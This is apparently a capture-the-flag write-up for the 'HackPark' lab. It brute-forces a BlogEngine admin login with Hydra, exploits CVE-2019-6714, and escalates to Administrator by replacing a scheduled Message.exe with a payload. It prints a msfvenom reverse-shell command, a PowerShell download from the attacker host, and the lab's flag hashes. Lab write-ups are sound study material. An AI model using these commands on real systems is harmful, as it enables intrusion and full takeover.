> HackPark | Hydar | WinPEAS | RCE

# Nmap/Rustscan

nmap -sC -sV -A -Pn -vv $IP

```
80/tcp open  http    syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server? syn-ack
```

We got a website with login form and let's start with hydra to get creds. Let's try for `admin` account.

# Hydra

 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.37.72  http-post-form "/Account/login.aspx:__VIEWSTATE=ScTUsDEL61RxXQbUkxPIvjWwWIPtRoGua7VlvlhkXMv83IlH8nDZNBJap5qDDRHYpohgQkDHiy%2FBC%2BxgOpa%2BQyclcuurGR6oEQrtrgMMab51BRVITHbw51etTYHg%2BOSqlTEdhO1sq6LyFJ6OiiTP6d9DJf02wqbnAd2tPNuj2XvUivov&__EVENTVALIDATION=IwDYcG9QBNf8p2xPKx%2B%2Fw5JxMDpBvm8H7wN1ksA5dw9A8UBpnwOCo0Dw%2BPk5zNJmkB9lQ%2FliisMfMuMuK0XXTqgvEqLeivDFKIVc5TL58r9bwhfN6No%2FVNcCXAAYsaZZOdkMyqjZVNaOltsfMh1u4e0p9aFSTmWecZYwxusByDyG%2FSae&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -t 64

```
[80][http-post-form] host: 10.10.37.72   login: admin   password: 1qaz2wsx
```

And we are in! Looks like we are running `BlogEngine 3.3.6.0`. Let's search for exploits.

And we got an RCE exploit with directory traversal.`CVE-2019-6714`. 

# Steps to exploit

1. Access `http://10.10.10.10/admin/app/editor/editpost.cshtml` and upload the code of file named as `PostView.ascx`.
2. Now accessing `http://10.10.10.10/?theme=../../App_Data/files` we got the shell!

We are in as `iis apppool\blog`. but this shell is not good so let's get a stable shell.

# Payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.107.21 LPORT=4444 -f exe > shell.exe

# Metasploit

1. use exploit/multi/handler
2. set payload windows/meterpreter/reverse_tcp
3. set LPORT 4444
4. set LHOSt 10.8.107.21

**Note: In unstable shell `powershell Invoke-WebRequest -Uri http://10.8.107.21:8000/shell.exe -Outfile shell.exe` to get the file**

Let's save the output of `systeminfo` command to a txt file and run windows exploit suggester.

`/windows-exploit-suggester.py --database 2021-05-01-mssb.xls --systeminfo OS_details.txt`

And we got a bunch of exploits. But before that let's try winPEAS. 

# WinPEAS

We got some interesting stuff.

```
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
```

In the folder, we can find `LogFile.txt`

```
08/05/19 13:26:28,Starting System Scheduler SERVICE (SYSTEM)
08/05/19 14:03:43,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:11:27,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:16:26,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:12:16,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:30:29,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:31:29,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:48:55,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:50:01,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:03:23,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:04:22,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:05:49,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:06:49,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:10:59,Stopping System Scheduler SERVICE. (SYSTEM)
04/30/21 22:27:45,Starting System Scheduler SERVICE (SYSTEM)
```

Looking at the processes using ps we can find `Message.exe` and it keeps running and stopping repeatedly. 

Let's create a msfvenom payload and name it as `Message.exe`. Also let's rename the old `Message.exe`.
`ren Message.exe Message.exe.bak`
We can also share files using Impacket's SMBserver.py.

```
smbserver.py smbshare .
copy \\10.8.107.21\smbfolder\Message.exe
```

Now we got a shell as `HACKPARK\Administrator`.

# user.txt => C:\Users\jeff\Desktop

```
759bd8af507517bcfaede78a21a73e39
```

# root.txt

```
7e13d97f05f7ceb9881a3eb3d78d3e72
```

We can also exploit using Juicy Potato as suggested in Windows Exploit Suggester.